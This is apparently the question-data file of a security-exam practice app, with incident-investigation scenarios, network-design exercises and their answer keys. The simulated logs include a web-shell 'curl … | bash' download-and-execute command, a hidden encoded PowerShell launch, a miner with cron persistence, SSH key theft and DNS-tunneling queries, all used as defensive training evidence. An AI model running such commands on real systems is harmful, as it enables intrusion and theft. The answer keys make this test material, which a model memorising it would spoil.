// Interactive PBQs: build-a-network diagrams (type "build") and click-to-investigate networks (type "topo").
// Format: see app/diagram.js. Coordinates are percentages of the diagram (x: left→right, y: top→bottom).
PBQ.add([

// ======================= INVESTIGATE THE NETWORK =======================
{
  id: "topo-ransomware", domain: 4, obj: "4.8", time: 8, type: "topo", level: "hard", h: 440,
  title: "Investigate the network: ransomware outbreak",
  scenario: `<p>Users report that files on the finance share now end in <b>.locked</b>. You have remote access to every device behind the firewall. Click each device to review its processes, connections and logs, then classify it.</p>
  <p><b>Origin</b> = the first device compromised (patient zero). <b>Infected</b> = malicious code ran on it. <b>Clean</b> = nothing malicious executed, even if it was targeted.</p>`,
  task: "Classify every machine, then answer the follow-up questions.",
  choices: ["Clean", "Infected", "Origin"],
  nodes: [
    { id: "inet", label: "Internet", icon: "cloud", x: 9, y: 50,
      views: { "Threat intel": "198.51.100.23   C2 server used by a ransomware affiliate   (confidence: high)\n203.0.113.80    Microsoft 365 front door                  (benign)" } },
    { id: "fw", label: "Firewall", icon: "firewall", x: 29, y: 50, role: "Edge firewall; also routes between internal VLANs",
      views: { "Firewall log": "08:14:52 ALLOW 10.0.10.21:51544 -> 198.51.100.23:443  TCP  (destination first seen today)\n08:15:22 ALLOW 10.0.10.21:51544 -> 198.51.100.23:443  repeating every 30s\n08:31:05 ALLOW 10.0.10.34:50122 -> 198.51.100.23:443  TCP\n08:40:11 ALLOW 10.0.10.21:52044 -> 10.0.20.10:445    SMB  1.2 MB  (user VLAN -> server VLAN)\n09:00:00 ALLOW 10.0.10.47:49812 -> 203.0.113.80:443   TCP  (Microsoft 365)" } },
    { id: "sw", label: "Core switch", icon: "switch", x: 49, y: 50 },
    { id: "ws1", label: "WS-ACCT1", ip: "10.0.10.21", icon: "pc", x: 71, y: 24, role: "Accounting workstation (user: mreed)", a: "Origin",
      w: "mreed opened a macro-enabled invoice from email; Excel spawned encoded PowerShell, which dropped upd.exe, added a Run key, beaconed to the C2 first (08:14), then used the svc_backup account to reach the other hosts over SMB.",
      views: {
        "Processes": "PID   PARENT  NAME            COMMAND LINE\n3888  2210    OUTLOOK.EXE\n4120  3888    EXCEL.EXE       \"Q3_invoice.xlsm\"\n4388  4120    cmd.exe         /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4A...\n4402  4388    powershell.exe  -nop -w hidden -enc SQBFAFgAIAAoAE4A...\n5010  4402    upd.exe         C:\\Users\\mreed\\AppData\\Roaming\\upd.exe",
        "Connections": "PROTO  LOCAL              REMOTE              STATE        PID\nTCP    10.0.10.21:51544   198.51.100.23:443   ESTABLISHED  5010\nTCP    10.0.10.21:52011   10.0.10.34:445      ESTABLISHED  4\nTCP    10.0.10.21:52019   10.0.10.47:445      ESTABLISHED  4\nTCP    10.0.10.21:52044   10.0.20.10:445      ESTABLISHED  4",
        "Event log": "08:14:31  Outlook: attachment Q3_invoice.xlsm opened (from: billing@acme-invoices.example)\n08:14:40  Office: macros enabled for Q3_invoice.xlsm\n08:15:02  Sysmon 11 FileCreate  C:\\Users\\mreed\\AppData\\Roaming\\upd.exe\n08:15:05  Sysmon 13 RegistrySet HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = upd.exe\n08:29:47  4648 Logon with explicit credentials: ACME\\svc_backup -> 10.0.10.34, 10.0.10.47, 10.0.20.10"
      } },
    { id: "ws2", label: "WS-HR2", ip: "10.0.10.34", icon: "pc", x: 91, y: 24, role: "HR workstation (user: tlopez)", a: "Infected",
      w: "A scheduled task was created remotely from WS-ACCT1 using svc_backup, it ran wupd.exe from Temp, and that process is beaconing to the same C2. Malicious code executed, but it wasn't first.",
      views: {
        "Processes": "PID   PARENT  NAME          COMMAND LINE\n704   612     svchost.exe   -k netsvcs\n2950  2210    chrome.exe\n6120  704     wupd.exe      C:\\Windows\\Temp\\wupd.exe   (started by Task Scheduler)",
        "Connections": "PROTO  LOCAL              REMOTE              STATE        PID\nTCP    10.0.10.34:50122   198.51.100.23:443   ESTABLISHED  6120\nTCP    10.0.10.34:445     10.0.10.21:52011    ESTABLISHED  4",
        "Event log": "08:30:58  4698 Scheduled task created: \\WinUpdate  by ACME\\svc_backup from 10.0.10.21\n08:31:02  Task Scheduler: \\WinUpdate started C:\\Windows\\Temp\\wupd.exe\n08:31:03  Defender: real-time protection was turned off"
      } },
    { id: "ws3", label: "WS-SALES3", ip: "10.0.10.47", icon: "laptop", x: 71, y: 78, role: "Sales laptop (user: kpark)", a: "Clean",
      w: "The same payload was pushed from WS-ACCT1, but Defender quarantined it before it ran and the scheduled task failed. Its only internet traffic is Microsoft 365. Targeted, not infected — still reset credentials and keep watching it.",
      views: {
        "Processes": "PID   PARENT  NAME          COMMAND LINE\n1880  1720    explorer.exe\n3302  1880    Teams.exe\n3410  1880    chrome.exe\n2240  612     MsMpEng.exe   (Microsoft Defender)",
        "Connections": "PROTO  LOCAL              REMOTE              STATE        PID\nTCP    10.0.10.47:49812   203.0.113.80:443    ESTABLISHED  3302",
        "Defender log": "08:31:10  Detected Trojan:Win32/Ransom.Gen in C:\\Windows\\Temp\\wupd.exe (copied from \\\\10.0.10.21\\ADMIN$)\n08:31:10  Action taken: QUARANTINED. No process was created.\n08:31:11  4698 Scheduled task \\WinUpdate creation FAILED: file not found"
      } },
    { id: "fs1", label: "FS-01", ip: "10.0.20.10", icon: "server", x: 91, y: 78, role: "File server (finance share D:\\Shares)", a: "Infected",
      w: "A service was installed remotely from WS-ACCT1 and is running the encryptor, which has renamed thousands of files. This is where the damage is happening, but the timeline shows it was reached last.",
      views: {
        "Processes": "PID   PARENT  NAME          COMMAND LINE\n640   512     services.exe\n7012  640     rcl.exe       -path D:\\Shares -ext .locked -note README_RESTORE.txt   (service 'RclSvc')",
        "Connections": "PROTO  LOCAL              REMOTE              STATE        PID\nTCP    10.0.20.10:445     10.0.10.21:52044    ESTABLISHED  4   (ADMIN$ share)\n(no outbound internet connections)",
        "Files": "08:40:14  New service 'RclSvc' installed by ACME\\svc_backup from 10.0.10.21\n08:41:02  D:\\Shares\\Finance\\budget_2027.xlsx.locked\n08:41:02  D:\\Shares\\Finance\\README_RESTORE.txt\n08:47:30  14,882 files renamed to *.locked in 6 minutes"
      } }
  ],
  links: [["inet","fw"],["fw","sw"],["sw","ws1"],["sw","ws2"],["sw","ws3"],["sw","fs1"]],
  cols: ["Answer"],
  opts: [["Phishing email with a macro-enabled attachment", "RDP brute force from the internet", "Malicious USB drive", "Watering-hole website"]],
  rowOpts: {
    1: ["Isolate WS-ACCT1, WS-HR2 and FS-01, and block 198.51.100.23 at the firewall", "Reboot the file server", "Reimage WS-SALES3 first", "Turn off firewall logging to save disk space"],
    2: ["ACME\\svc_backup", "kpark's Microsoft 365 license", "The local Guest account", "The switch's SNMP community string"]
  },
  rows: [
    { l: "What was the initial infection vector?", a: ["Phishing email with a macro-enabled attachment"], w: "Outlook opened Q3_invoice.xlsm, macros were enabled, and Excel spawned PowerShell." },
    { l: "BEST immediate containment action", a: ["Isolate WS-ACCT1, WS-HR2 and FS-01, and block 198.51.100.23 at the firewall"], w: "Contain every infected host and cut the C2 channel. Rebooting destroys memory evidence; WS-SALES3 isn't infected." },
    { l: "Which account must be disabled and reset right away?", a: ["ACME\\svc_backup"], w: "The attacker used svc_backup's credentials (event 4648) to move laterally to every other host." }
  ],
  explain: "Build a timeline: the origin has the earliest event from OUTSIDE (the email at 08:14) and the first C2 beacon. Infected hosts show something actually executing (a process, a service, a task) plus C2 traffic or damage. A host where the payload was blocked before running is clean — but credentials used against it should still be reset."
},
{
  id: "topo-cloud-miner", domain: 2, obj: "2.4", time: 8, type: "topo", level: "hard", h: 440,
  title: "Investigate the network: cloud bill spike",
  scenario: `<p>The cloud bill tripled overnight and the web app is slow. The environment is a WAF/firewall in front of a web server, an app server and a database, plus an admin's laptop on the VPN. Inspect each device and classify it.</p>
  <p><b>Origin</b> = where the attacker first got in. <b>Infected</b> = malicious code ran on it. <b>Clean</b> = no malicious execution.</p>`,
  task: "Classify every device, then answer the follow-up questions.",
  choices: ["Clean", "Infected", "Origin"],
  nodes: [
    { id: "inet", label: "Internet", icon: "cloud", x: 9, y: 50,
      views: { "Threat intel": "203.0.113.66   Hosts exploit scripts and a Monero mining pool proxy (port 3333)   (confidence: high)" } },
    { id: "waf", label: "WAF / firewall", icon: "firewall", x: 29, y: 50,
      views: { "WAF log": "02:11:40 POST /wp-content/plugins/formx/upload.php  src 203.0.113.66  rule 933110 (PHP upload) MATCH  action: LOG ONLY (detection mode)\n02:12:05 GET  /wp-content/uploads/shell.php?cmd=id           src 203.0.113.66  no rule match\n02:13:10 EGRESS ALLOW 10.1.1.10 -> 203.0.113.66:3333\n02:58:44 EGRESS ALLOW 10.1.2.20 -> 203.0.113.66:3333" } },
    { id: "sw", label: "VPC router", icon: "router", x: 49, y: 50 },
    { id: "web", label: "web-01", ip: "10.1.1.10", icon: "server", x: 71, y: 24, role: "Public web server (WordPress)", a: "Origin",
      w: "The attacker exploited the formx upload plugin, dropped shell.php, then ran a download-and-execute command as www-data that started a miner and read the deploy user's SSH key. Everything starts here.",
      views: {
        "Web log": "203.0.113.66 - - [02:11:40] \"POST /wp-content/plugins/formx/upload.php HTTP/1.1\" 200\n203.0.113.66 - - [02:12:05] \"GET /wp-content/uploads/shell.php?cmd=id HTTP/1.1\" 200\n203.0.113.66 - - [02:12:41] \"GET /wp-content/uploads/shell.php?cmd=curl%20-s%20http://203.0.113.66/x.sh%7Cbash HTTP/1.1\" 200",
        "Processes": "USER      PID   %CPU  COMMAND\nwww-data  2201   1.0  php-fpm: pool www\nwww-data  2290   0.0  sh -c curl -s http://203.0.113.66/x.sh | bash\nwww-data  2315  97.8  ./kswapd0 -o 203.0.113.66:3333 --donate-level 0",
        "Audit log": "02:12:58 auditd: www-data read /home/deploy/.ssh/id_rsa\n02:13:02 auditd: www-data executed /usr/bin/ssh deploy@10.1.2.20"
      } },
    { id: "app", label: "app-01", ip: "10.1.2.20", icon: "server", x: 91, y: 24, role: "Application server", a: "Infected",
      w: "The attacker logged in with the deploy key stolen from web-01, installed the same miner and added a cron job for persistence. Malicious code ran, but it wasn't the entry point.",
      views: {
        "auth.log": "02:13:03 sshd: Accepted publickey for deploy from 10.1.1.10 port 51022  (normally only from 10.1.9.5)\n02:58:30 sudo: deploy : COMMAND=/usr/bin/crontab -l",
        "Processes": "USER    PID   %CPU  COMMAND\ndeploy  4410  98.4  /tmp/.x/kswapd0 -o 203.0.113.66:3333\nappsvc  1022   6.1  java -jar orders.jar",
        "Crontab": "@reboot /tmp/.x/kswapd0 -o 203.0.113.66:3333 >/dev/null 2>&1"
      } },
    { id: "db", label: "db-01", ip: "10.1.3.30", icon: "db", x: 71, y: 78, role: "Database (PostgreSQL)", a: "Clean",
      w: "Only expected connections from app-01 on 5432, normal CPU, and no new logins. It's slow because the app server is starved for CPU, not because the database was touched.",
      views: {
        "Connections": "PROTO  LOCAL            REMOTE            STATE        PROCESS\nTCP    10.1.3.30:5432   10.1.2.20:40122   ESTABLISHED  postgres\nTCP    10.1.3.30:5432   10.1.2.20:40130   ESTABLISHED  postgres",
        "Processes": "USER      PID   %CPU  COMMAND\npostgres  880   11.9  postgres: orders orders 10.1.2.20 SELECT\npostgres  881    0.4  postgres: autovacuum launcher",
        "auth.log": "(no logins in the last 7 days except ansible patching on the 1st of the month)"
      } },
    { id: "admin", label: "admin-lt", ip: "10.1.9.5", icon: "laptop", x: 91, y: 78, role: "Admin laptop (on VPN)", a: "Clean",
      w: "Normal processes and traffic. Its key is the only one normally used for deploy logins — the 02:13 login came from web-01 instead, which points away from this laptop.",
      views: {
        "Processes": "PID   NAME             %CPU\n2210  code.exe          3.2\n3011  ssh.exe           0.1   (to 10.1.2.20, 16:02 yesterday — change ticket CHG-2290)\n2240  MsMpEng.exe       0.8",
        "Connections": "PROTO  LOCAL           REMOTE              STATE\nTCP    10.1.9.5:50311  203.0.113.80:443    ESTABLISHED  (Microsoft 365)\nUDP    10.1.9.5:51820  198.51.100.10:51820 (company VPN)"
      } }
  ],
  links: [["inet","waf"],["waf","sw"],["sw","web"],["sw","app"],["sw","db"],["sw","admin","dashed"]],
  cols: ["Answer"],
  opts: [["Cryptominer (cryptojacking)", "Ransomware", "Keylogger", "Rootkit"]],
  rowOpts: {
    1: ["Remove/patch the vulnerable plugin and switch the WAF from detection to blocking mode", "Give the web server more CPU", "Change the database password", "Block outbound port 443"],
    2: ["Default-deny egress; allow only required destinations", "Allow all outbound so updates keep working", "Disable IPv6", "Turn on UPnP"]
  },
  rows: [
    { l: "What is the malware?", a: ["Cryptominer (cryptojacking)"], w: "High CPU, the --donate-level flag and connections to a mining pool on port 3333." },
    { l: "BEST fix to stop it happening again", a: ["Remove/patch the vulnerable plugin and switch the WAF from detection to blocking mode"], w: "The WAF matched the exploit but only logged it. Patch the root cause and enforce the rule." },
    { l: "Which network control would have limited the damage?", a: ["Default-deny egress; allow only required destinations"], w: "Servers rarely need arbitrary outbound access. Egress filtering would have blocked the download and the pool connection." }
  ],
  explain: "Cryptojacking indicators: sustained high CPU, an unexpected cloud bill, processes disguised with system-like names (kswapd0) and outbound connections to mining pools. Trace the attacker's path: exploit → web shell → stolen SSH key → lateral movement → persistence (cron)."
},
{
  id: "topo-c2-dns", domain: 4, obj: "4.9", time: 8, type: "topo", level: "hard", h: 440,
  title: "Investigate the network: beacons and tunnels",
  scenario: `<p>The SOC's NetFlow dashboard shows unusual outbound traffic. Inspect each device and decide whether it's <b>compromised</b> or <b>clean</b>. Not every unusual-looking pattern is malicious — check for authorization.</p>`,
  task: "Classify every device, then answer the follow-up questions.",
  choices: ["Clean", "Compromised"],
  nodes: [
    { id: "inet", label: "Internet", icon: "cloud", x: 9, y: 50,
      views: { "Threat intel": "x7q.example.net    Domain registered 3 days ago; no website; authoritative NS in a bulletproof host\n198.51.100.77      No reputation history\n203.0.113.120      Contracted offsite backup provider (per vendor list)" } },
    { id: "fw", label: "Firewall", icon: "firewall", x: 29, y: 32,
      views: { "Flow summary (24h)": "SRC          DST                  PORT   SUMMARY\n10.2.0.15    10.2.0.53            53     41,880 DNS queries (normal host: ~600)\n10.2.0.22    10.2.0.0/16          1-65535  480,000 SYNs, 02:00-04:00\n10.2.0.31    198.51.100.77        8443   1.4 KB every 300.0s, 24h, no DNS lookup before first connection\n10.2.0.40    203.0.113.120        443    38.6 GB, 01:00-02:30" } },
    { id: "dns", label: "DNS resolver", ip: "10.2.0.53", icon: "server", x: 29, y: 74,
      views: { "Query log": "10.2.0.15  TXT  aGVsbG8gd29ybGQgdGhpcyBpcyBkYXRh.x7q.example.net\n10.2.0.15  TXT  cGF5cm9sbF8yMDI3X2V4cG9ydC5jc3Yg.x7q.example.net\n10.2.0.15  TXT  bm90aGluZyB0byBzZWUgaGVyZSBtb3Zl.x7q.example.net\n... 41,000+ similar queries, all unique, all TXT, all under x7q.example.net\n10.2.0.31  (no lookups for 198.51.100.77)" } },
    { id: "sw", label: "Core switch", icon: "switch", x: 50, y: 50 },
    { id: "h15", label: "WS-15", ip: "10.2.0.15", icon: "pc", x: 72, y: 24, role: "Finance workstation", a: "Compromised",
      w: "Tens of thousands of unique TXT queries with base64-looking labels under one newly registered domain is DNS tunneling — data (one label decodes to 'payroll_2027_export.csv') is leaving through DNS.",
      views: {
        "Processes": "PID   PARENT  NAME             COMMAND LINE\n1880  1720    explorer.exe\n5532  1880    svch0st.exe      C:\\ProgramData\\svch0st.exe -d x7q.example.net -m txt",
        "Connections": "UDP  10.2.0.15:61022 -> 10.2.0.53:53   (very high rate)\n(no other unusual connections)"
      } },
    { id: "h22", label: "SCAN-01", ip: "10.2.0.22", icon: "server", x: 92, y: 24, role: "Vulnerability scanner", a: "Clean",
      w: "Huge SYN counts look like reconnaissance, but this is the authorized vulnerability scanner running its approved weekly window with a change ticket. Authorized activity is not compromise.",
      views: {
        "Scheduler": "Job: weekly-internal-full   Window: Sun 02:00-04:00   Targets: 10.2.0.0/16   Approved: CHG-5150 (Security)\nLast run: Sun 02:00-03:52  status: completed",
        "Processes": "PID   NAME              USER\n910   nessusd           svc_scan\n(no other non-default processes)"
      } },
    { id: "h31", label: "WS-31", ip: "10.2.0.31", icon: "laptop", x: 72, y: 78, role: "Marketing laptop", a: "Compromised",
      w: "A fixed 300-second interval, a fixed 1.4 KB size, a raw IP with no DNS lookup and an odd port, from a DLL launched by rundll32 out of a browser download — textbook C2 beaconing.",
      views: {
        "Processes": "PID   PARENT  NAME           COMMAND LINE\n3410  1880    chrome.exe\n6020  3410    rundll32.exe   C:\\Users\\jbell\\Downloads\\invoice_viewer.dll,Start",
        "Connections": "PROTO  LOCAL              REMOTE              STATE        PID\nTCP    10.2.0.31:51210    198.51.100.77:8443  ESTABLISHED  6020"
      } },
    { id: "h40", label: "BKP-02", ip: "10.2.0.40", icon: "server", x: 92, y: 78, role: "Backup server", a: "Clean",
      w: "38 GB at night looks like exfiltration, but it goes to the contracted offsite backup provider on the documented schedule. Volume alone doesn't make it malicious — destination and authorization matter.",
      views: {
        "Backup job": "Job: nightly-offsite   Schedule: daily 01:00   Destination: 203.0.113.120 (vendor: contracted, listed in vendor register)\nLast run: 01:00-02:29  38.6 GB  status: success  encrypted: AES-256",
        "Processes": "PID   NAME           USER\n1400  backupagent    svc_backup"
      } }
  ],
  links: [["inet","fw"],["fw","sw"],["dns","sw"],["dns","fw","dashed"],["sw","h15"],["sw","h22"],["sw","h31"],["sw","h40"]],
  cols: ["Answer"],
  opts: [["Force all DNS through the internal resolver, block other outbound DNS, and alert on high-volume TXT/long subdomains", "Block all DNS everywhere", "Enable DNSSEC on our own zone", "Lengthen DHCP leases"]],
  rowOpts: {
    1: ["Fixed interval and fixed size to a raw IP with no DNS lookup", "It uses TCP", "It happens during business hours", "It uses a high port number"],
    2: ["Check for authorization — a change ticket, schedule or approved vendor", "Assume all large or noisy traffic is malicious", "Ignore anything on port 443", "Only look at CPU usage"]
  },
  rows: [
    { l: "BEST control against DNS tunneling", a: ["Force all DNS through the internal resolver, block other outbound DNS, and alert on high-volume TXT/long subdomains"], w: "Centralize DNS so it can be inspected, then detect the pattern. Blocking all DNS breaks everything; DNSSEC protects your records, not exfiltration." },
    { l: "What distinguishes WS-31's beacon from normal traffic?", a: ["Fixed interval and fixed size to a raw IP with no DNS lookup"], w: "Regularity plus a hard-coded IP is the strongest beacon signal." },
    { l: "What separates SCAN-01 and BKP-02 from real threats?", a: ["Check for authorization — a change ticket, schedule or approved vendor"], w: "Noisy or high-volume isn't the same as malicious." }
  ],
  explain: "DNS tunneling: huge numbers of unique, long, encoded subdomains (often TXT) under one domain. Beaconing: regular intervals and sizes, often straight to an IP. Before calling something malicious, check for authorization — scanners and backups are noisy by design."
},

// ======================= BUILD A NETWORK =======================
{
  id: "build-office-net", domain: 3, obj: "3.2", time: 7, type: "build", level: "hard", h: 470,
  title: "Build a network: secure office with a public web app",
  scenario: `<p>A company is building its office network. It hosts a public web app in a DMZ, has remote staff, and wants admin access and Wi-Fi locked down. Drag the BEST appliance onto each numbered position.</p>`,
  task: "Place an appliance on every numbered position. Read each position's description below the diagram.",
  devices: ["NGFW", "WAF", "Load balancer", "IPS (inline)", "IDS (passive)", "VPN concentrator", "Jump server", "RADIUS server", "UTM", "Proxy server", "HSM", "SIEM"],
  zones: [{ label: "DMZ", x: 38, y: 3, w: 61, h: 24 }, { label: "Server VLAN", x: 79, y: 31, w: 20, h: 23 }],
  nodes: [
    { id: "inet", label: "Internet", icon: "cloud", x: 9, y: 42 },
    { id: "web", label: "Web servers", icon: "server", x: 89, y: 16 },
    { id: "core", label: "Core switch", icon: "switch", x: 66, y: 42 },
    { id: "srv", label: "AD + database", icon: "db", x: 89, y: 43 },
    { id: "remote", label: "Remote staff", icon: "users", x: 9, y: 74 },
    { id: "ap", label: "Staff Wi-Fi AP", icon: "wifi", x: 47, y: 90 }
  ],
  slots: [
    { id: "s1", n: 1, x: 27, y: 42, a: "NGFW", hint: "Internet edge: filters all inbound and outbound traffic with application awareness", w: "The perimeter boundary — an NGFW adds app awareness and IPS features to stateful filtering." },
    { id: "s2", n: 2, x: 47, y: 16, a: "WAF", hint: "First device in the DMZ: inspects HTTP for SQL injection and XSS", w: "Layer 7 protection for the web app sits directly in front of it." },
    { id: "s3", n: 3, x: 68, y: 16, a: "Load balancer", hint: "Spreads requests across the web server pool with health checks", w: "Availability and scale for the pool." },
    { id: "s4", n: 4, x: 47, y: 42, a: "IPS (inline)", hint: "Inline between the edge and the core: blocks known exploit traffic", w: "Inline placement is what lets it block." },
    { id: "s5", n: 5, x: 27, y: 74, a: "VPN concentrator", hint: "Terminates remote staff's encrypted tunnels", w: "Remote-access VPN termination." },
    { id: "s6", n: 6, x: 66, y: 68, a: "IDS (passive)", hint: "Receives a SPAN copy of core traffic and alerts", w: "A copy of traffic can't be blocked — passive sensor = IDS." },
    { id: "s7", n: 7, x: 89, y: 68, a: "Jump server", hint: "The only path admins may use to manage servers", w: "A hardened, monitored single entry point for admin sessions." },
    { id: "s8", n: 8, x: 68, y: 90, a: "RADIUS server", hint: "Authenticates each Wi-Fi user (802.1X / WPA3-Enterprise)", w: "802.1X needs a central AAA back end." }
  ],
  links: [["inet","s1"],["s1","s2"],["s2","s3"],["s3","web"],["s1","s4"],["s4","core"],["core","srv"],["core","s6","dashed"],["core","s7"],["s7","srv"],["remote","s5","dashed"],["s5","s4"],["ap","core"],["ap","s8","dashed"]],
  explain: "Inline = IPS (can block); SPAN/tap = IDS (alerts only). WAF goes in front of web apps, load balancers in front of pools, jump servers on the management path, RADIUS behind 802.1X. UTM, proxy, HSM and SIEM are distractors here: a UTM is an all-in-one for small sites, an HSM stores keys and a SIEM collects logs."
},
{
  id: "build-cloud-vpc", domain: 3, obj: "3.1", time: 7, type: "build", level: "hard", h: 470,
  title: "Build a network: secure cloud VPC",
  scenario: `<p>You're deploying a three-tier app in a public cloud. The app servers and database must not have public IP addresses, admins need SSH access, and the on-premises data center must connect privately. Place the BEST component on each numbered position.</p>`,
  task: "Place a component on every numbered position, then answer the follow-up questions.",
  devices: ["WAF", "Load balancer", "NAT gateway", "Bastion host", "VPN gateway", "Internet-facing database", "CASB", "Proxy server", "IDS (passive)"],
  zones: [{ label: "VPC 10.0.0.0/16", x: 15, y: 3, w: 84, h: 94 }, { label: "Public subnet", x: 23, y: 10, w: 39, h: 50 }, { label: "Private app subnet", x: 65, y: 10, w: 32, h: 50 }, { label: "Private DB subnet", x: 65, y: 66, w: 32, h: 27 }],
  nodes: [
    { id: "inet", label: "Internet", icon: "cloud", x: 5, y: 33 },
    { id: "igw", label: "Internet gateway", icon: "router", x: 16, y: 55 },
    { id: "app", label: "App servers", icon: "server", x: 81, y: 35 },
    { id: "db", label: "Database", icon: "db", x: 81, y: 80 },
    { id: "dc", label: "On-prem DC", icon: "server", x: 5, y: 82 }
  ],
  slots: [
    { id: "c1", n: 1, x: 33, y: 22, a: "WAF", hint: "Inspects all inbound HTTPS for injection attacks before it reaches the app", w: "Layer 7 filtering at the front door." },
    { id: "c2", n: 2, x: 53, y: 22, a: "Load balancer", hint: "Public entry point that spreads traffic across private app servers", w: "Only the load balancer needs to be public; the app servers stay private." },
    { id: "c3", n: 3, x: 33, y: 48, a: "NAT gateway", hint: "Lets private app servers download patches without accepting inbound connections", w: "Outbound-only internet for private subnets." },
    { id: "c4", n: 4, x: 53, y: 48, a: "Bastion host", hint: "Hardened SSH entry point for admins into the private subnets", w: "One monitored jump point instead of public IPs on servers." },
    { id: "c5", n: 5, x: 40, y: 82, a: "VPN gateway", hint: "Encrypted site-to-site link to the on-premises data center", w: "IPsec site-to-site tunnel into the VPC." }
  ],
  links: [["inet","igw"],["igw","c1"],["c1","c2"],["c2","app"],["app","db"],["app","c3"],["c3","igw"],["igw","c4"],["c4","app","dashed"],["dc","c5","dashed"],["c5","app"]],
  cols: ["Answer"],
  opts: [["Allow 5432 only from the app servers' security group", "Allow 5432 from 0.0.0.0/0", "Allow all traffic from anywhere in the VPC", "Allow SSH (22) from the internet"]],
  rowOpts: { 1: ["The cloud provider", "Your team", "The database vendor's customers", "Nobody — managed services don't need patching"] },
  rows: [
    { l: "Inbound rule for the database's security group", a: ["Allow 5432 only from the app servers' security group"], w: "Least privilege: only the tier that needs the database can reach it." },
    { l: "If you switch to a managed database service (PaaS), who patches the database engine?", a: ["The cloud provider"], w: "In PaaS the provider manages the OS and engine; you still own data, access and configuration." }
  ],
  explain: "Classic secure VPC: only the WAF/load balancer face the internet; app and DB tiers live in private subnets; a NAT gateway gives outbound-only access; a bastion host (or session manager) handles admin access; a VPN gateway connects on-premises privately. An internet-facing database is the trap answer — never expose the data tier."
},
{
  id: "build-zero-trust", domain: 1, obj: "1.2", time: 6, type: "build", level: "hard", h: 440,
  title: "Build a network: Zero Trust access",
  scenario: `<p>The company is replacing VPN access to its HR app with Zero Trust. Every request must be evaluated using the user's identity and the device's health, and the decision must be enforced in the path between the user and the app. Place the BEST component on each numbered position.</p>`,
  task: "Place a component on every numbered position, then answer the follow-up questions.",
  devices: ["Policy enforcement point (PEP)", "Policy engine (PE)", "Policy administrator (PA)", "Identity provider (IdP)", "MDM / device posture", "VPN concentrator", "Load balancer", "Implicit trust zone"],
  zones: [{ label: "Control plane", x: 18, y: 3, w: 80, h: 38 }, { label: "Data plane", x: 3, y: 55, w: 95, h: 40 }],
  nodes: [
    { id: "user", label: "User + laptop", icon: "laptop", x: 12, y: 76 },
    { id: "hr", label: "HR app", icon: "server", x: 86, y: 76 }
  ],
  slots: [
    { id: "z1", n: 1, x: 49, y: 76, a: "Policy enforcement point (PEP)", hint: "Sits in the traffic path; allows, blocks or ends the session", w: "The PEP enforces decisions in the data plane." },
    { id: "z2", n: 2, x: 33, y: 22, a: "Policy engine (PE)", hint: "Evaluates policy and makes the allow/deny decision", w: "The PE decides — the 'brain'." },
    { id: "z3", n: 3, x: 55, y: 22, a: "Policy administrator (PA)", hint: "Tells the enforcement point to open or close the session", w: "The PA executes the decision by signaling the PEP." },
    { id: "z4", n: 4, x: 82, y: 12, a: "Identity provider (IdP)", hint: "Confirms who the user is (SSO + MFA)", w: "Identity is a core input to the policy decision." },
    { id: "z5", n: 5, x: 82, y: 32, a: "MDM / device posture", hint: "Reports whether the laptop is patched, encrypted and compliant", w: "Device health is the other key signal." }
  ],
  links: [["user","z1"],["z1","hr"],["z2","z3"],["z3","z1","dashed"],["z4","z2","dashed"],["z5","z2","dashed"]],
  cols: ["Answer"],
  opts: [["Data plane", "Control plane", "Management VLAN", "DMZ"]],
  rowOpts: { 1: ["The PE re-evaluates, and the PA tells the PEP to restrict or end the session", "Nothing until the user logs in again tomorrow", "The VPN disconnects everyone", "The HR app emails the user"] },
  rows: [
    { l: "Which plane does the PEP belong to?", a: ["Data plane"], w: "It handles the actual traffic. The PE and PA are control plane." },
    { l: "Midway through a session, the laptop's posture fails (EDR stops). What should happen?", a: ["The PE re-evaluates, and the PA tells the PEP to restrict or end the session"], w: "Zero Trust verifies continuously, not just at login." }
  ],
  explain: "Policy decision point (PDP) = policy engine (decides) + policy administrator (executes); the PEP enforces in the data plane. Inputs include identity (IdP), device posture (MDM/EDR), threat intel and activity logs. A VPN concentrator and an 'implicit trust zone' are the old model this replaces."
}
]);
